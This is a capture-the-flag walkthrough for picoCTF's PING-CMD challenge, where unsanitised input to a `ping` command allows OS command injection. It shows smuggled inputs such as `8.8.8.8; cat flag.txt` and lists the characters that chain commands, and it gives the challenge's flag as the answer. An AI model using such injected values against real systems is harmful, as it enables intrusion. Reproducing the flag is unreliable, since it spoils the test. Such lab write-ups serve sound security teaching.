# PING-CMD PROBLEM GUIDE:

*(General Skills — Easy, 100pt)*

## HINTS:
Hint 1: The input is passed to a shell `ping` command with no sanitization.

## TOOLS:
`$ nc <host> <port>`

Shell command chaining: `cmd1; cmd2`

## WALKTHROUGH:
1. `$ nc mysterious-sea.picoctf.net <port>`
    - "we only allow '8.8.8.8'" — so the input must contain `8.8.8.8`, and is likely dropped into `ping <input>`

2. In Linux shells, `command1; command2` runs the second after the first. Inject a second command:
    - Input: `8.8.8.8; ls -la`
    - After the ping output you see `flag.txt` in the directory

3. Input: `8.8.8.8; cat flag.txt`
    - Answer: `picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_8555bda7}`

## NOTES:
- Classic OS command injection: user input concatenated into a shell command. `;`, `&&`, `|`, `$(...)` all chain or substitute commands.
- The `8.8.8.8` prefix keeps the original `ping` valid so the line parses; the `;` starts your payload.
